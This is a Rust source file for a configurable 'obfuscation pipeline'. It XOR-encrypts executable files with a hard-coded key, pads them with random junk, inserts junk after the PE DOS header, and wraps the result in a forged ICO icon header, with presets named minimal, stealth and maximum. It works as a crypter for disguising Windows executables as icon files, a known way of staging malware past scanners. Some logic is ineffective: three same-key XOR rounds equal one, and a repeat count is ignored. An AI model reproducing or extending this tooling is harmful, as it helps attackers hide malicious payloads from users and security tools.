use std::fs;
use std::path::Path;
use rand::Rng;

/// Obfuscation step trait for modular pipeline
pub trait ObfuscationStep {
    fn name(&self) -> &str;
    fn apply(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
    fn is_repeatable(&self) -> bool { false }
}

/// Generate random junk data
pub fn generate_junk_data(size: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    (0..size).map(|_| rng.gen()).collect()
}

/// Pre-encryption junk appending
pub struct PreJunkAppender {
    pub size: usize,
}

impl ObfuscationStep for PreJunkAppender {
    fn name(&self) -> &str { "pre_junk_append" }

    fn apply(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut result = Vec::new();
        result.extend_from_slice(&generate_junk_data(self.size));
        result.extend_from_slice(data);
        Ok(result)
    }
}

/// Post-encryption junk appending
pub struct PostJunkAppender {
    pub size: usize,
}

impl ObfuscationStep for PostJunkAppender {
    fn name(&self) -> &str { "post_junk_append" }

    fn apply(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut result = data.to_vec();
        result.extend_from_slice(&generate_junk_data(self.size));
        Ok(result)
    }
}

/// XOR encryption step
pub struct XorEncryptor {
    pub key: String,
}

impl ObfuscationStep for XorEncryptor {
    fn name(&self) -> &str { "xor_encrypt" }

    fn apply(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut encrypted = Vec::with_capacity(data.len());
        for (i, &byte) in data.iter().enumerate() {
            let key_byte = self.key.as_bytes()[i % self.key.len()];
            encrypted.push(byte ^ key_byte);
        }
        Ok(encrypted)
    }
}

/// PE section interleaver (inserts junk between sections)
pub struct SectionInterleaver {
    pub junk_size: usize,
}

impl ObfuscationStep for SectionInterleaver {
    fn name(&self) -> &str { "section_interleave" }

    fn apply(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        if data.len() < 64 {
            return Ok(data.to_vec());
        }

        let mut result = Vec::new();
        // Copy DOS header (first 64 bytes)
        result.extend_from_slice(&data[0..64]);

        // Insert junk
        result.extend_from_slice(&generate_junk_data(self.junk_size));

        // Copy rest of PE
        result.extend_from_slice(&data[64..]);

        Ok(result)
    }
}

/// ICO wrapper step
pub struct IcoWrapper;

impl ObfuscationStep for IcoWrapper {
    fn name(&self) -> &str { "ico_wrap" }

    fn apply(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        create_ico_with_embedded_data(data)
    }
}

/// Create ICO file with embedded data
fn create_ico_with_embedded_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut ico_data = Vec::new();

    // ICO file header
    ico_data.extend_from_slice(&[0x00, 0x00]); // Reserved
    ico_data.extend_from_slice(&[0x01, 0x00]); // Type (1 = icon)
    ico_data.extend_from_slice(&[0x01, 0x00]); // Number of images (1)

    // Image directory entry
    let image_offset = 22;
    let image_size = data.len() as u32;

    ico_data.extend_from_slice(&[0x20]); // Width (32x32)
    ico_data.extend_from_slice(&[0x20]); // Height (32x32)
    ico_data.extend_from_slice(&[0x00]); // Color count
    ico_data.extend_from_slice(&[0x00]); // Reserved
    ico_data.extend_from_slice(&[0x01, 0x00]); // Color planes
    ico_data.extend_from_slice(&[0x20, 0x00]); // Bits per pixel
    ico_data.extend_from_slice(&image_size.to_le_bytes()); // Size of image data
    ico_data.extend_from_slice(&(image_offset as u32).to_le_bytes()); // Offset to image data

    // Append the data as "image" data
    ico_data.extend_from_slice(data);

    Ok(ico_data)
}

/// Configurable obfuscation pipeline
pub struct ObfuscationPipeline {
    steps: Vec<Box<dyn ObfuscationStep>>,
}

impl ObfuscationPipeline {
    pub fn new() -> Self {
        Self { steps: Vec::new() }
    }

    pub fn add_step(&mut self, step: Box<dyn ObfuscationStep>) {
        self.steps.push(step);
    }

    pub fn add_repeatable_step(&mut self, step: Box<dyn ObfuscationStep>, _count: usize) {
        // Add the step once, then repeat it by calling process multiple times
        self.steps.push(step);
        // Store the repeat count for later use
        // Note: This is a simplified approach - in practice you'd want to store this info
    }

    /// Add multiple encryption steps with the same key
    pub fn add_multiple_encryption(&mut self, key: String, count: usize) {
        for _ in 0..count {
            self.steps.push(Box::new(XorEncryptor { key: key.clone() }));
        }
    }

    /// Add multiple junk appending steps
    pub fn add_multiple_junk(&mut self, pre_size: usize, post_size: usize, count: usize) {
        for _ in 0..count {
            self.steps.push(Box::new(PreJunkAppender { size: pre_size }));
            self.steps.push(Box::new(PostJunkAppender { size: post_size }));
        }
    }

    pub fn process(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut current_data = data.to_vec();

        for (i, step) in self.steps.iter().enumerate() {
            println!("Step {}: {}", i + 1, step.name());
            current_data = step.apply(&current_data)?;
            println!("  Data size: {} bytes", current_data.len());
        }

        Ok(current_data)
    }

    pub fn process_file(&self, input_path: &Path, output_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
        let data = fs::read(input_path)?;
        let processed_data = self.process(&data)?;
        fs::write(output_path, processed_data)?;
        Ok(())
    }
}

/// Preset pipeline configurations
pub struct PipelinePresets;

impl PipelinePresets {
    /// Minimal pipeline: just encryption + ICO
    pub fn minimal() -> ObfuscationPipeline {
        let mut pipeline = ObfuscationPipeline::new();
        pipeline.add_step(Box::new(XorEncryptor {
            key: "P Q R S T V X Y Z ".to_string()
        }));
        pipeline.add_step(Box::new(IcoWrapper));
        pipeline
    }

    /// Stealth pipeline: multiple layers of obfuscation
    pub fn stealth() -> ObfuscationPipeline {
        let mut pipeline = ObfuscationPipeline::new();
        pipeline.add_step(Box::new(PreJunkAppender { size: 1024 }));
        pipeline.add_step(Box::new(SectionInterleaver { junk_size: 512 }));
        pipeline.add_step(Box::new(XorEncryptor {
            key: "P Q R S T V X Y Z ".to_string()
        }));
        pipeline.add_step(Box::new(PostJunkAppender { size: 2048 }));
        pipeline.add_step(Box::new(IcoWrapper));
        pipeline
    }

    /// Maximum obfuscation: repeatable steps
    pub fn maximum() -> ObfuscationPipeline {
        let mut pipeline = ObfuscationPipeline::new();
        pipeline.add_step(Box::new(PreJunkAppender { size: 2048 }));
        pipeline.add_step(Box::new(SectionInterleaver { junk_size: 1024 }));

        // Multiple encryption rounds using the new method
        pipeline.add_multiple_encryption("P Q R S T V X Y Z ".to_string(), 3);

        pipeline.add_step(Box::new(PostJunkAppender { size: 4096 }));
        pipeline.add_step(Box::new(IcoWrapper));
        pipeline
    }
}
